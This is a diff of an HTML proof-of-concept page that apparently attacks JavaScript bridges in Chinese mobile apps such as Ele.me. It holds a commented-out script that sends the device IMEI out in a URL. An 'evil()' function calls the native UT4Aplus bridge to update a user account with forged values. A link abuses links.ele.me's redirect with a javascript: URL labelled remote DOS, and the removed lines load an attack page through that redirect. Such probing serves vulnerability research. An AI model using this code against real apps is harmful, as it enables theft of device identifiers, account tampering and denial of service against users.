@@ -1,8 +1,41 @@
+<!--<script>window.open('http://payment.vmall.com?IMEI='+vmallAndroid.getIMEI())</script>-->
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>eleme test</title>
 
 
-//<script>
- // location.href = 'http://download.taobaocdn.com/wireless/xiami-android-spark/latest/xiami-android-spark_10001593.apk'
-//  location.href = 'http://links.ele.me/stage?url=https://justingangha.github.io/easyhtml/attack_pp.html'
-//</script>
+</head>
+<body>
+<p id="content">CC Test </p>
+<script>
+    function callback(var1, var2) {
+        alert('var1 : ' + var1 + ' ,  var2 :' + var2);
+    }
 
-<iframe src="http://links.ele.me/stage?url=https://justingangha.github.io/easyhtml/attack_pp.html"></iframe>
+    function evil() {
+        temp = {
+            "methodName": "updateUserAccount",
+            "params": "{\"userNick\": \"111\", \"userId\": \"222\", \"openId\": \"333\", \"sid\": \"123\"}",
+            "callback": "callback",
+            "sid": "123"
+        };
+        var json = JSON.stringify(temp);
+        // alert(json);
+        if (window.UT4Aplus) {
+            userInfo = 'bridgeVersion-' + window.UT4Aplus.CALL(json);
+        } else {
+            userInfo = "nothing";
+        }
+    }
+
+    // evil();
+</script>
+</body>
+
+<button type="button" onclick="evil()">调用js接口</button>
+<a href="http://links.ele.me/stage?url=javascript:"/>远程DOS</a>
+
+</html>
